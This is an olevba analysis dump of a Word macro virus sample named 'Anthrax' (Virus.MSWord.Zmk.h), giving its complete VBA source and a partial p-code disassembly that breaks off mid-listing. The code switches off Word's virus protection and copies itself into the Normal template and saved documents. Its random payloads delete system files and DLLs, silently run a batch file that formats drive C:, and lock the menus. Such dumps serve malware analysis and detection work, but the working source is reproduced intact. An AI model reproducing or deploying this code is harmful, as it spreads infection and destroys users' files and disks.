olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Anthrax.bas 
in file: Virus.MSWord.Zmk.h - OLE stream: 'Macros/VBA/Anthrax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFN
    Call Anthrax
ErrorFN:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAN
    Call Anthrax
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "Anthrax" Then
        AnthraxInstalled = -1
    End If
Next i
If Not AnthraxInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Anthrax", Object:=wdOrganizerObjectProjectItems
    MsgBox "Modèle Normal infecté!!!!", vbCritical, "Virus Anthrax"
End If
ErrorAO:
End Sub
Private Sub Anthrax()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAx
MsgBox "Anthrax est en train de contaminer votre ordinateur!!!!", vbCritical, "Virus Anthrax"
ActiveDocument.Shapes.AddLine(0#, 0#, 597.6, 0#).Select
For i = 1 To 1000
ActiveDocument.Shapes.AddLine(0#, 0#, 597.6, 0#).Select
ActiveDocument.Shapes.AddLine(0#, i, 597.6, i).Select
Selection.ShapeRange.Line.Weight = 6#
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Line.Style = msoLineSingle
Next i
Dim Nbre, MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Randomize
Nbre = Int(Rnd * 20) + 1
If Nbre = 1 Or Nbre = 3 Or Nbre = 5 Or Nbre = 7 Then
    Kill "C:\Autoexec.bat"
    Kill "C:\Config.sys"
    Kill "C:\Windows\System\*.dll"
End If
If Nbre = 2 Or Nbre = 4 Or Nbre = 6 Or Nbre = 8 Then
Message:
    StatusBar = "HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
GoTo Message
End If
If (Nbre = 10 Or Nbre = 12 Or Nbre = 14 Or Nbre = 16) And D$ = "15" Then
    Open "C:\Anthrax.bat" For Output As #1
        Print #1, "Cls"
        Print #1, "Echo off"
        Print #1, "Echo Le virus Anthrax va détruire votre disque dur!!!"
        Print #1, "Echo y|Format c: /u /Autotest /v:Anthrax"
        Print #1, "Echo o|Format c: /u /Autotest /v:Anthrax"
    Close #1
    Shell "C:\Anthrax.bat", vbHide
End If
If Nbre = 13 Or Nbre = 15 Or Nbre = 17 Then
    CommandBars("File").Enabled = False
    CommandBars("Edit").Enabled = False
    CommandBars("Tools").Enabled = False
    CommandBars("File").Name = "Anthrax"
    CommandBars("Edit").Name = "Anthrax"
    CommandBars("File").Name = "Anthrax"
    MsgBox "Je suis le Virus Anthrax..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "Virus Anthrax"
End If
ErrorAx:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Anthrax", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Le virus ANTHRAX ne peut pas vous autoriser l'accès!!!" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "Virus Anthrax"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    Assistant.Visible = True
    With Assistant.NewBalloon
        .Button = msoButtonSetOK
        .Heading = "Virus Anthrax"
        .Text = "Attention, ce menu n'est pas autorisé..."
        .Show
    End With
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    ActiveWindow.Caption = "Virus Anthrax par ZeMacroKiller98"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1192 bytes
' Macros/VBA/Anthrax - 20044 bytes
' Line #0:
' 	FuncDefn (Sub FileNew())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorFN 
' Line #6:
' 	ArgsCall (Call) Anthrax 0x0000 
' Line #7:
' 	Label ErrorFN 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub AutoNew())
' Line #10:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	OnError ErrorAN 
' Line #15:
' 	ArgsCall (Call) Anthrax 0x0000 
' Line #16:
' 	Label ErrorAN 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub AutoOpen())
' Line #19:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #20:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	OnError ErrorAO 
' Line #24:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #26:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0007 "Anthrax"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0001 
' 	UMi 
' 	St AnthraxInstalled 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld AnthraxInstalled 
' 	Not 
' 	IfBlock 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Anthrax"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	LitStr 0x0019 "Modèle Normal infecté!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus Anthrax"
' 	ArgsCall MsgBox 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Label ErrorAO 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Private Sub Anthrax())
' Line #37:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #38:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #41:
' 	OnError ErrorAx 
' Line #42:
' 	LitStr 0x0037 "Anthrax est en train de contaminer votre ordinateur!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus Anthrax"
' 	ArgsCall MsgBox 0x0003 
' Line #43:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	LitR8 0xCCCD 0xCCCC 0xACCC 0x4082 
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddLine 0x0004 
' 	ArgsMemCall Set 0x0000 
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' Line #45:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	LitR8 0xCCCD 0xCCCC 0xACCC 0x4082 
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddLine 0x0004 
' 	ArgsMemCall Set 0x0000 
' Line #46:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	Ld i 
' 	LitR8 0xCCCD 0xCCCC 0xACCC 0x4082 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddLine 0x0004 
' 	ArgsMemCall Set 0x0000 
' Line #47:
' 	LitR8 0x0000 0x0000 0x0000 0x4018 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Weight 
' Line #48:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Visible 
' Line #49:
' 	Ld msoLineSingle 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Style 
' Line #50:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Dim 
' 	VarDefn Nbre
' 	VarDefn MyDate
' Line #52:
' 	Ld Date 
' 	St MyDate 
' Line #53:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #54:
' 	ArgsCall Read 0x0000 
' Line #55:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Nbre 
' Line #56:
' 	Ld Nbre 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Nbre 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x0005 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x0007 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #57:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	LitStr 0x000D "C:\Config.sys"
' 	ArgsCall Kill 0x0001 
' Line #59:
' 	LitStr 0x0017 "C:\Windows\System\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld Nbre 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Nbre 
' 	LitDI2 0x0004 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x0006 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x0008 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #62:
' 	Label Message 
' Line #63:
' 	LitStr 0x004B "HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	LitStr 0x0052 "       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #68:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	LitStr 0x005A "               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	LitStr 0x0062 "                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	LitStr 0x006A "                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #76:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	LitStr 0x0072 "                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	LitStr 0x007A "                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	LitStr 0x0082 "                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #86:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	LitStr 0x008A "                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #89:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	LitStr 0x0092 "                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #92:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	LitStr 0x009A "                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #94:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	LitStr 0x00A2 "                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #97:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #98:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	LitStr 0x00AA "                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' 	LitStr 0x00B2 "                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #103:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	LitStr 0x00BA "                                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	LitStr 0x00C2 "                                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #109:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #110:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #111:
' 	LitStr 0x00CA "                                                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #112:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #113:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	LitStr 0x00D2 "                                                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
' 	St StatusBar 
' Line #115:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #116:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' 	GoTo Message 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	Ld Nbre 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld Nbre 
' 	LitDI2 0x000C 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x000E 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x0010 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld D$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #120:
' 	LitStr 0x000E "C:\Anthrax.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Cls"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Echo off"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "Echo Le virus Anthrax va détruire votre disque dur!!!"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "Echo y|Format c: /u /Autotest /v:Anthrax"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "Echo o|Format c: /u /Autotest /v:Anthrax"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #127:
' 	LitStr 0x000E "C:\Anthrax.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Ld Nbre 
' 	LitDI2 0x000D 
' 	Eq 
' 	Ld Nbre 
' 	LitDI2 0x000F 
' 	Eq 
' 	Or 
' 	Ld Nbre 
' 	LitDI2 0x0011 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #130:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #131:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #132:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #133:
' 	LitStr 0x0007 "Anthrax"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt New 
' Line #134:
' 	LitStr 0x0007 "Anthrax"
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt New 
' Line #135:
' 	LitStr 0x0007 "Anthrax"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt New 
' Line #136:
' 	LitStr 0x001B "Je suis le Virus Anthrax..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000F "HAHAHAHAHA!!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus Anthrax"
' 	ArgsCall MsgBox 0x0003 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	Label ErrorAx 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FileSaveAs())
' Line #141:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #142:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #143:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #144:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #145:
' 	OnError ErrorFSA 
' Line #146:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #147:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #148:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Anthrax"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #151:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #152:
' 	Label ErrorFSA 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub FileTemplates())
' Line #155:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #156:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #157:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #158:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #159:
' 	OnError ErrorFT 
' Line #160:
' 	LitStr 0x0036 "Le virus ANTHRAX ne peut pas vous autoriser l'accès!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus Anthrax"
' 	ArgsCall MsgBox 0x0003 
' Line #161:
' 	Label ErrorFT 
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub ToolsMacro())
' Line #164:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #165:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #166:
